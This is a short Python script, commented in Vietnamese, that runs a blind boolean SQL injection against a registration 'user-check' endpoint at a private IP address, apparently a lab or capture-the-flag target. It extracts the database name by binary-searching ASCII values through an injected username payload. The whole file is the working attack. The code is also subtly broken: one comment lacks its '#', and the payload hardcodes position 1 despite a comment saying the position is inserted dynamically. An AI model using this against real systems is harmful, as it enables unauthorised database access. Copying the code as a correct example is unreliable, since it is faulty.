```
 import requests

url = "http://10.48.133.213/register/user-check"
ten_database = ""

 Giả sử tên database có tối đa 10 ký tự, ta cho vòng lặp chạy từ 1 đến 10
for vi_tri in range(1, 11):
    low = 32
    high = 126
    ky_tu_tim_duoc = ""
    
    while low < high:
        mid = (low + high) // 2
        
        # Đưa biến 'vi_tri' và 'mid' động vào câu lệnh SQL
        payload= f"admin' and ASCII(SUBSTRING(database(),1,1)) > {mid} -- -"
        response=requests.get(url,params={'username':payload}) 
        
        if '"available":false' in response.text:
          low = mid + 1
        else :
          high =mid 
            
    # Khi tìm xong 1 ký tự, ta chuyển đổi mã ASCII thành chữ và cộng dồn vào kết quả
    ky_tu_tim_duoc = chr(low)
    
    # Nếu gặp ký tự rỗng (mã ASCII = 32 hoặc kết thúc chuỗi), ta có thể dừng lại
    if low == 32: 
        break
        
    ten_database += ky_tu_tim_duoc
    print(f"Đang tìm... Tên hiện tại là: {ten_database}")

print(f"✨ Kết quả cuối cùng: {ten_database}")
```
